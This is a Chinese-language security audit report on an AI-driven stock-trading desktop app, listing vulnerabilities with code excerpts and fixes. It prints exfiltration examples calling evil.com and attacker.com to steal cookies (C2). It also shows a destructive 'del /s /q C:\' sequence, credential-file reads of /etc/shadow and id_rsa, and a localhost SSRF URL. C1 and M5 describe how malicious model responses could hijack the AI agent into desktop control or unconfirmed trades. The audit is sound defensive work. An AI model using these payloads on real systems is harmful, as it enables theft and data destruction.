# 小土豆全能操盘手 — 安全审计报告

**审计日期**: 2026-06-10  
**代码库**: GBTxiaotudouquannengcaopanshou  
**审计范围**: 全部核心 Python 后端 + FastAPI 接口 + Electron 前端关键文件  

---

## 汇总统计

| 严重级别 | 数量 | 
|---------|------|
| 🔴 Critical (严重) | 4 未修复 / 1 已修复 |
| 🟠 High (高危) | 8 |
| 🟡 Medium (中危) | 8 |
| 🔵 Low (低危) | 5 |

---

## 🔴 Critical — 严重漏洞

### C1. vision.py — AI驱动的桌面RCE (远程代码执行)
**文件**: `potato/vision.py` 行 266-354  
**风险**: AI驱动的自主视觉操作循环 `visual_operate` 可被劫持实现完整桌面控制。

```python
# AI返回的action直接执行，无安全审查
if action_type == "click" and action.get("x") is not None:
    action_result.update(gui_click(int(action["x"]), int(action["y"])))
elif action_type == "type" and action.get("text"):
    action_result.update(gui_type_text(action["text"]))  # 可输入任意文本
elif action_type == "hotkey" and action.get("keys"):
    action_result.update(gui_hotkey(*action["keys"]))  # 可执行任意热键
```

- `gui_type_text(text)` 可在当前焦点窗口输入任意文本（如终端命令）
- `gui_click(x, y)` 可点击任意屏幕坐标
- `gui_hotkey(*keys)` 可执行任意热键组合（如 Win+R 打开运行对话框）
- AI从 DeepSeek 接收JSON指令后直接执行，无二次确认
- `max_steps=15` 是唯一限制，但15步足以执行 `Win+R → cmd → del /s /q C:\` 等破坏性操作

**攻击场景**: DeepSeek API被中间人攻击/返回恶意响应 → AI返回 `{"type":"hotkey","keys":["win","r"]}` 接着 `{"type":"type","text":"cmd"}` → 完全RCE。

**修复建议**: 对 `gui_type_text`/`gui_hotkey` 加入操作白名单和危险操作确认弹窗；限制可输入的文本内容；添加"危险热键"黑名单（Win+R, Ctrl+Alt+Del等）。

---

### C2. browser/engine.py — JS沙箱绕过 (RCE in Browser Context)
**文件**: `potato/browser/engine.py` 行 22-27, 190-203  
**风险**: `evaluate_js` 的白名单正则仅匹配字符串开头，可绕过执行任意JS。

```python
_SAFE_JS_PATTERNS = [
    re.compile(r"^document\.\s*(querySelector|getElementById|...)\s*\(", re.DOTALL),
    re.compile(r"^window\.\s*(location|scrollTo|scrollBy)\b", re.DOTALL),
]
```

**绕过方式**:
- `document.querySelector('script').remove(); fetch('https://evil.com/steal?c='+document.cookie)` — 开头匹配 `document.querySelector(` 但后续执行恶意代码
- `window.location = 'https://attacker.com/steal-cookies?c='+document.cookie` — `window.location` 赋值可导航到恶意站点窃取cookies
- 正则只检查 `^`（开头匹配），不检查 `$`（结尾匹配）

**修复建议**: 白名单正则必须添加 `$` 结尾锚定，或改用CSP/沙箱iframe；禁止 `window.location` 赋值。

---

### C3. telegram_bot.py — 通知劫持 (授权绕过)
**文件**: `potato/telegram_bot.py` 行 124-126; `potato/bot_activation.py` 行 43-46  
**风险**: 任何先给bot发消息的用户可自动绑定为自己的chat_id。

```python
# telegram_bot.py 行 125
def handle_incoming(self, chat_id, text):
    upsert_bot_secret("TELEGRAM_CHAT_ID", str(chat_id))  # 无条件覆盖！

# bot_activation.py 行 43-46
discover = BotNotifier().telegram_discover_chat_id()
if discover.get("ok"):
    upsert_bot_secret("TELEGRAM_CHAT_ID", discover["chat_id"])  # 同样无条件覆盖
```

**攻击场景**: 攻击者给bot发一条消息 → 自己的chat_id覆盖了合法用户的 → 所有交易推送、持仓信息发送给攻击者。

**修复建议**: `upsert_bot_secret("TELEGRAM_CHAT_ID", ...)` 应验证发送者身份；如果已有chat_id则不覆盖或需确认。

---

### C4. cycle_timeout.py — 假超时保护 (逻辑缺陷)
**文件**: `potato/cycle_timeout.py` 行 24-55  
**风险**: `cycle_timeout` 上下文管理器实际不中断执行，仅事后检查。

```python
# timeout_handler 定义但从未被自动调用
def timeout_handler():
    elapsed = time.time() - start_time
    if elapsed > max_seconds:
        raise CycleTimeout(...)  # 永远不会被自动触发

# yield后控制权交给调用者，超时检查发生在代码块执行完后
try:
    yield timeout_handler  # 仅返回函数引用
finally:
    elapsed = time.time() - start_time  # finally只是记录日志，不raise
```

交易循环可能无限期运行，无实际超时保护。在实盘模式下，这意味着失控的交易循环可能造成重大财务损失。

**修复建议**: 使用 `signal.alarm` 或 `threading.Timer` 实现真正的超时中断。

---

### C5. vault.py — 加密密钥派生强度不足 + 桌面模式回退风险 ✅ 已修复
**文件**: `potato/vault.py` 行 95-173; `potato/paths.py` 行 36-49  
**原风险**: 

1. 桌面模式下，加密密钥从 `machine_id` 派生：`f"{platform.node()}-{os.getenv('USER', os.getenv('USERNAME', 'unknown'))}"` — 主机名+用户名极易获取，攻击者若获得 `.vault_salt` 文件和机器信息即可解密所有密钥。

2. 如果 `cryptography` 包未安装，`_get_cipher()` 返回 `None`，导致 `_encrypt()` 直接抛出 RuntimeError，但 `credentials.py` 中先 `_encrypt()` 再检查 `_get_cipher()`，这意味着加密操作可能在异常消息中泄露部分信息。

3. Salt文件 `.vault_salt` 存在 data 目录下，与加密数据库同目录，攻击者获取一个即可获取全部。

**已实施修复** (2026-06-10):

1. **OS keyring 替换弱 machine_id**: 桌面模式密钥派生改为优先使用 `keyring` 库（Windows DPAPI / macOS Keychain / Linux Secret Service）。生成随机 master key 存入系统密钥链，不再依赖 hostname+username。`keyring` 不可用时 fallback 到旧方式并记录 warning。
2. **Salt 独立存储**: 新增 `paths.get_secure_config_dir()` 函数，salt 文件存至平台安全目录（Windows: `%APPDATA%/potato-desktop-pet/`, macOS: `~/Library/Application Support/potato-desktop-pet/`, Linux: `~/.local/share/potato-desktop-pet/`），与数据库目录分离。旧位置 salt 自动迁移到新位置。
3. **base64 回退确认已移除**: `_encrypt()`/`_decrypt()` 在 cipher=None 时直接 raise RuntimeError，无 base64 明文回退。

---

## 🟠 High — 高危漏洞

### H1. browser/actions.py — SSRF白名单包含localhost
**文件**: `potato/browser/actions.py` 行 26  
**风险**: URL白名单包含 `localhost` 和 `127.0.0.1`，允许浏览器导航到内部服务。

```python
_URL_WHITELIST_RE = re.compile(
    r"^https?://([a-zA-Z0-9.-]+\.)?"
    r"(eastmoney\.com|10jqka\.com\.cn|xueqiu\.com|localhost|127\.0\.0\.1)"
    r"([:/]|$)", re.IGNORECASE
)
```

**攻击场景**: AI生成指令 `{"action":"navigate","url":"http://localhost:6379/"}` → 浏览器访问内部Redis/数据库等未认证服务。

**修复建议**: 从URL白名单移除 `localhost`/`127.0.0.1`。

---

### H2. plugins.py — 任意文件读取 (信息泄露)
**文件**: `potato/plugins.py` 行 405-433  
**风险**: `_deepaudit_file` 可读取进程可读的任意文件并发送到外部API。

```python
def _deepaudit_file(params):
    file_path = params.get("file_path", "")
    if not file_path or not os.path.isfile(file_path):  # 仅检查文件存在，无路径限制
        return ...
    with open(file_path, encoding="utf-8", errors="replace") as f:
        code = f.read()  # 读取任意文件
    result = _deepaudit_snippet({"code": code, ...})  # 发送到外部API/LLM
```

**攻击场景**: `call_plugin("deepaudit", "audit_file", {"file_path": "/etc/shadow"})` 或 `{"file_path": "C:\\Users\\ADMIN\\.ssh\\id_rsa"}` → 敏感文件内容发送到 DeepAudit API 或 DeepSeek LLM。

**修复建议**: `_deepaudit_file` 应限制可读路径（如仅限项目目录）。

---

### H3. plugins.py — SSRF via DEEPAUDIT_API_URL
**文件**: `potato/plugins.py` 行 300-301, 351-359  
**风险**: `DEEPAUDIT_API_URL` 环境变量可指向内部服务。

```python
_DEEPAUDIT_URL = os.environ.get("DEEPAUDIT_API_URL", "http://localhost:8000/api/v1")
# ...
resp = client.post(f"{api_url}/api/v1/analysis/instant", json={...})
```

如果环境变量被设置为内部服务URL，用户提供的代码片段会被POST到内部服务。

**修复建议**: 验证 `DEEPAUDIT_API_URL` 为合法外部URL；禁止 localhost/private IP 段。

---

### H4. notifications.py — SSRF via 钉钉/飞书 Webhook URL
**文件**: `potato/notifications.py` 行 161-185, 187-247  
**风险**: `DINGTALK_WEBHOOK_URL` 和 `FEISHU_WEBHOOK_URL` 如果被配置为内部URL，每次发送通知都会触发SSRF。

```python
def _send_dingtalk(self, text):
    webhook = self.settings.dingtalk_webhook_url  # 用户配置的URL
    url = webhook  # 直接使用，无验证
    resp = httpx.post(url, json={...}, timeout=30.0)
```

**修复建议**: 对 webhook URL 做域名白名单校验。

---

### H5. zeabur.py — 部署包泄露敏感文件 (信息泄露)
**文件**: `potato/zeabur.py` 行 157-172  
**风险**: `_zip_project` 虽跳过了 `.env` 等文件，但遗漏多个敏感文件。

```python
skip_dirs = {".git", ".venv", "__pycache__", "data", "node_modules"}
skip_files = {".env", ".secrets.local.json", ".zeabur-build.env", "zbpack.json"}
```

**遗漏的敏感文件**:
- `data/app_secrets.db` — 虽然 `data` 目录被跳过，但如果数据存在其他位置则不会被跳过
- `*.pem`, `*.key`, `*.p12` 证书文件
- `config/potato.yaml` 可能含敏感配置

**修复建议**: 增加 `*.pem`, `*.key`, `*.p12`, `config/` 到跳过列表。

---

### H6. voice.py — RapidASR 模型下载 (供应链RCE)
**文件**: `potato/voice.py` 行 182-206  
**风险**: 从HuggingFace下载模型，如果仓库被入侵，可能包含恶意pickle载荷。

```python
from rapid_paraformer import RapidParaformer, download_hf_model
download_hf_model(repo_id="SWHL/RapidParaformer", save_dir=str(model_dir))
_rapid_model = RapidParaformer(str(config_path))  # 加载模型，可能执行pickle反序列化
```

**修复建议**: 使用 `safetensors` 格式模型；验证模型文件哈希。

---

### H7. user_prefs.py — 风控参数无验证 + 自动交易可绕过风控确认
**文件**: `potato/user_prefs.py` 行 85-90  
**风险**:
- `update()` 方法不验证值的有效性（如 `max_single_trade_cny` 可设为负数，`stop_loss_pct` 可设为 0 或 1.0）
- `auto_trade_enabled=True` 可在 `risk_confirmed=False` 时设置，绕过风控确认机制

**修复建议**: 添加参数范围验证；auto_trade_enabled 应强制要求 risk_confirmed=True。

---

### H8. broker.py — TRADING_MODE 环境变量可被注入切换到实盘模式
**文件**: `potato/trading/broker.py` 行 38  
**风险**: `TRADING_MODE = os.environ.get("TRADING_MODE", "dry_run").lower()` — 如果环境变量被注入为 `"live"`，则所有交易变为实盘。

在 `_resolve_mode()` 中也有同样的问题：如果 UserPrefs 中 `trading_mode` 被设为 `live`（通过API/app.py无认证的端点），也会切换到实盘。

**修复建议**: 实盘切换需要多重确认（如额外的POTATO_LIVE_CONFIRMED密钥 + 用户二次确认）。

---

## 🟡 Medium — 中危漏洞

### M1. browser/desktop_apps.py — macOS命令注入
**文件**: `potato/browser/desktop_apps.py` 行 90-93  
**风险**: `mac_bundle` 值直接插入shell参数字符串。

```python
result = subprocess.run(
    ["mdfind", f"kMDItemCFBundleIdentifier == '{app.mac_bundle}'"],
    # 如果 mac_bundle 包含单引号，可注入额外参数
)
```

当前 `mac_bundle` 来自硬编码的 `KNOWN_APPS`，但若未来允许用户添加自定义app，则可注入。

---

### M2. voice.py — 临时文件泄露
**文件**: `potato/voice.py` 行 221-233  
**风险**: 如果 `model(tmp_path)` 抛出异常，临时WAV文件不会被删除。

```python
with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as f:
    tmp_path = f.name
    # 写入音频数据...

result = model(tmp_path)
os.unlink(tmp_path)  # 如果上一行抛异常，此行不执行
```

---

### M3. memory.py — LIKE通配符注入 + 敏感数据注入AI上下文
**文件**: `potato/memory.py` 行 180-194, 312-361  
**风险**:
- `search_memories` 使用 `LIKE %s` + `f"%{keyword}%"`，keyword中的 `%` 和 `_` 会被当作LIKE通配符
- `build_memory_context` 将所有记忆注入AI系统提示，如果用户在对话中泄露了密码/token并被存储为记忆，则会暴露给后续所有AI调用

---

### M4. intel.py — XML解析潜在XXE
**文件**: `potato/intel.py` 行 38  
**风险**: `ET.fromstring(resp.text)` 解析外部RSS内容。Python 3.7.1+ 默认禁用外部实体，但仍建议使用 `defusedxml`。

---

### M5. browser_cycle.py — AI生成交易指令无确认
**文件**: `potato/browser_cycle.py` 行 328-393  
**风险**: `_execute_ai_trade` 让LLM生成浏览器操作步骤（CSS选择器、点击、填值），然后直接执行。在 `autonomous` 模式下，用户完全不在环。

---

### M6. app.py — FastAPI首页XSS
**文件**: `potato/app.py` 行 355-363  
**风险**: 首页HTML模板直接插入数据库值到HTML，未转义：

```python
for k, v in risk.items():
    label = {...}.get(k, k)
    val = "是" if k == "circuit_breaker" and v else "否" if k == "circuit_breaker" else v
    risk_html += f'<tr><td>{label}</td><td>{val}</td></tr>'
```

如果数据库值包含 `<script>` 标签，会导致XSS。虽然需要API Key才能访问首页，但仍是安全隐患。

---

### M7. app.py — /health 端点无需认证
**文件**: `potato/app.py` 行 396-399  
**风险**: `/health` 端点无需API Key即可访问。虽然只返回 `{"ok": True}`，但可被用于服务发现和探测。

---

### M8. db.py — update_order 使用 f-string 构建SQL
**文件**: `potato/db.py` 行 326-333  
**风险**: 虽然列名来自 `_UPDATE_FIELD_MAP` 白名单，但使用 f-string 构建SQL是不好的实践：

```python
sets = ", ".join(f"{col} = %s" for col in updates)
cur.execute(f"UPDATE orders SET {sets} WHERE client_order_id = %s", ...)
```

如果 `_UPDATE_FIELD_MAP` 被扩展时不注意，可能引入SQL注入。当前安全因为列名是硬编码白名单。

---

## 🔵 Low — 低危漏洞

### L1. browser/platforms.py — 加载无验证的用户JSON配置
`PlatformConfig(**data)` 无字段验证，恶意JSON可注入任意URL/选择器。

### L2. paths.py — POTATO_DATA_DIR环境变量可重定向数据目录
如果被设置为敏感目录，可能导致数据写入意外位置。

### L3. vision.py — sys.exit 猴子补丁
`_safe_import_pyautogui` 临时替换 `sys.exit`，可能影响并发线程。

### L4. trendradar.py — 固定第三方API依赖
`newsnow.busiyi.world` 是第三方服务，如果其DNS被劫持或服务下线，功能中断。

### L5. secret_store.py — SQLite fallback 无加密
当 CockroachDB 不可用时，secrets 存储在 SQLite 中，虽使用 Fernet 加密，但密钥来自 machine_id（如C5所述），保护力度弱。

---

## 最优先修复建议 (Top 5)

1. **vision.py (C1)**: 对 `gui_type_text`/`gui_hotkey` 加入操作白名单和危险操作确认弹窗；限制可输入的文本内容；添加"危险热键"黑名单
2. **browser/engine.py evaluate_js (C2)**: 白名单正则必须添加 `$` 结尾锚定，或改用CSP/沙箱iframe
3. **telegram_bot.py (C3)**: `upsert_bot_secret("TELEGRAM_CHAT_ID", ...)` 应验证发送者身份，不应无条件覆盖
4. **cycle_timeout.py (C4)**: 使用 `signal.alarm` 或 `threading.Timer` 实现真正的超时中断
5. **broker.py (H8)**: 实盘切换需要多重确认机制，不能仅靠环境变量或用户偏好

---

## 架构安全评估

### 优点 (做得好的地方)
- 使用 Fernet(AES-128-CBC+HMAC-SHA256) 加密存储凭据
- 风控系统有12条规则+熔断机制
- FastAPI 使用了 HMAC 比较API Key（时序安全）
- 有速率限制 (slowapi)
- 安全头中间件 (HSTS, X-Frame-Options, CSP)
- 日志脱敏工具 (mask_secret, SecretSafeLogger)
- 默认 dry_run 模式

### 需要改进的地方
- AI驱动的操作（vision, browser_cycle）缺乏足够的"人在环"确认
- 多处SSRF风险（webhook URL、API URL、localhost白名单）
- 超时保护形同虚设
- 加密密钥派生依赖弱机器指纹
- 环境变量可覆盖关键安全设置（交易模式、数据目录）
